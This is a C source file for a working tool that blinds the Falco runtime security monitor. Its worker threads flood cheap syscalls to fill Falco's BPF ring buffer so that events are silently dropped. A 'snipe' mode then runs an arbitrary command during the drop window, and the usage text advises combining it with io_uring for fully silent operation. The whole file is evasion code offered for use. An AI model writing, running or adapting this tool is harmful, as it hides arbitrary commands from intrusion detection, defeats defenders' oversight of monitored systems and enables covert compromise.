#define _GNU_SOURCE
#include <sys/syscall.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <pthread.h>
#include <signal.h>
#include <errno.h>

typedef struct {
    int  type;
    long count;
    int  stop;
} WorkerCtx;

static volatile sig_atomic_t g_stop_all = 0;

static void *worker_open(void *arg)
{
    WorkerCtx *ctx = (WorkerCtx *)arg;
    long c = 0;
    while (!g_stop_all && !ctx->stop) {
        int fd = open("/proc/version", O_RDONLY);
        if (fd >= 0) close(fd);
        c++;
    }
    ctx->count = c;
    return NULL;
}

static void *worker_read(void *arg)
{
    WorkerCtx *ctx = (WorkerCtx *)arg;
    char buf[512];
    int fd = open("/dev/zero", O_RDONLY);
    if (fd < 0) { ctx->count = 0; return NULL; }
    long c = 0;
    while (!g_stop_all && !ctx->stop) {
        read(fd, buf, sizeof(buf));
        c++;
    }
    close(fd);
    ctx->count = c;
    return NULL;
}

static void *worker_mixed(void *arg)
{
    WorkerCtx *ctx = (WorkerCtx *)arg;
    char buf[128];
    int zfd = open("/dev/zero", O_RDONLY);
    long c = 0;
    while (!g_stop_all && !ctx->stop) {
        int fd = open("/proc/loadavg", O_RDONLY);
        if (fd >= 0) { read(fd, buf, sizeof(buf)); close(fd); }
        if (zfd >= 0) read(zfd, buf, sizeof(buf));
        c++;
    }
    if (zfd >= 0) close(zfd);
    ctx->count = c;
    return NULL;
}

static void storm_run(int nthreads, int type, double secs)
{
    pthread_t *tids = calloc((size_t)nthreads, sizeof(pthread_t));
    WorkerCtx *ctxs = calloc((size_t)nthreads, sizeof(WorkerCtx));

    void *(*fn)(void *) = (type == 0) ? worker_open :
                          (type == 1) ? worker_read : worker_mixed;

    g_stop_all = 0;
    for (int i = 0; i < nthreads; i++) {
        ctxs[i].type = type;
        pthread_create(&tids[i], NULL, fn, &ctxs[i]);
    }

    usleep((unsigned int)(secs * 1e6));
    g_stop_all = 1;

    long total = 0;
    for (int i = 0; i < nthreads; i++) {
        pthread_join(tids[i], NULL);
        total += ctxs[i].count;
    }

    free(tids); free(ctxs);
    fprintf(stderr, "[+] storm done: %d threads x %.1fs = %ld iterations (~%ld events)\n",
            nthreads, secs, total, total * (type == 2 ? 4 : 2));
}

static void cmd_storm(const char *type_str, int nthreads, double secs)
{
    int type = (strcmp(type_str, "read-storm") == 0) ? 1 :
               (strcmp(type_str, "mixed-storm") == 0) ? 2 : 0;

    static const char *names[] = { "open-storm", "read-storm", "mixed-storm" };
    fprintf(stderr, "[*] %s: %d threads for %.1f seconds\n", names[type], nthreads, secs);
    fprintf(stderr, "[*] Falco's ringbuf will saturate - covert window opens\n");
    storm_run(nthreads, type, secs);
}

static void cmd_snipe(const char *cmd, int nthreads)
{

    fprintf(stderr, "[*] snipe: pre-flooding for 1s with %d threads to saturate ringbuf\n",
            nthreads);

    pthread_t *tids = calloc((size_t)nthreads, sizeof(pthread_t));
    WorkerCtx *ctxs = calloc((size_t)nthreads, sizeof(WorkerCtx));
    g_stop_all = 0;
    for (int i = 0; i < nthreads; i++)
        pthread_create(&tids[i], NULL, worker_mixed, &ctxs[i]);

    usleep(800000);

    fprintf(stderr, "[*] ringbuf saturated - executing covert command NOW\n");
    fprintf(stderr, "[*] command: %s\n", cmd);

    FILE *fp = popen(cmd, "r");
    if (fp) {
        char buf[65536]; size_t n;
        while ((n = fread(buf, 1, sizeof(buf), fp)) > 0)
            fwrite(buf, 1, n, stdout);
        pclose(fp);
    }

    fprintf(stderr, "[*] command done - stopping flood\n");
    g_stop_all = 1;

    long total = 0;
    for (int i = 0; i < nthreads; i++) {
        pthread_join(tids[i], NULL);
        total += ctxs[i].count;
    }
    free(tids); free(ctxs);

    fprintf(stderr, "[+] snipe complete - %ld storm iterations\n", total);
    fprintf(stderr, "[*] check falco.log for 'events dropped' - target event was in that window\n");
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr,
            "usage:\n"
            "  %s open-storm  [threads] [secs]  hammer open()+close() (sys_enter_openat)\n"
            "  %s read-storm  [threads] [secs]  hammer read() from /dev/zero\n"
            "  %s mixed-storm [threads] [secs]  mix of open+read (most events/s)\n"
            "  %s snipe <cmd> [threads]         flood 1s then exec cmd in drop window\n"
            "\nhow it works:\n"
            "  Falco's BPF probe writes one event per syscall into its ringbuf.\n"
            "  When the ringbuf (default 8 MB) fills, bpf_ringbuf_reserve fails\n"
            "  and events are silently dropped. Falco logs a drop count but not\n"
            "  which specific events were lost.\n"
            "\n"
            "  'snipe' runs a command at peak drop rate when Falco is most likely\n"
            "  to lose events. For fully silent operation, combine with io_uring_falco\n"
            "  for the covert op (io_uring generates zero sys_enter events regardless).\n"
            "\ndefaults: 8 threads, 5 seconds\n"
            "requires: nothing (unprivileged)\n",
            argv[0], argv[0], argv[0], argv[0]);
        return 1;
    }

    int nthreads = 8;
    double secs  = 5.0;

    if (strcmp(argv[1], "snipe") == 0) {
        if (argc < 3) { fprintf(stderr, "snipe: need <cmd>\n"); return 1; }
        nthreads = argc >= 4 ? atoi(argv[3]) : 8;
        cmd_snipe(argv[2], nthreads);
    } else if (strcmp(argv[1], "open-storm") == 0 ||
               strcmp(argv[1], "read-storm") == 0 ||
               strcmp(argv[1], "mixed-storm") == 0) {
        nthreads = argc >= 3 ? atoi(argv[2]) : 8;
        secs     = argc >= 4 ? atof(argv[3]) : 5.0;
        cmd_storm(argv[1], nthreads, secs);
    } else {
        fprintf(stderr, "unknown: %s\n", argv[1]);
        return 1;
    }
    return 0;
}
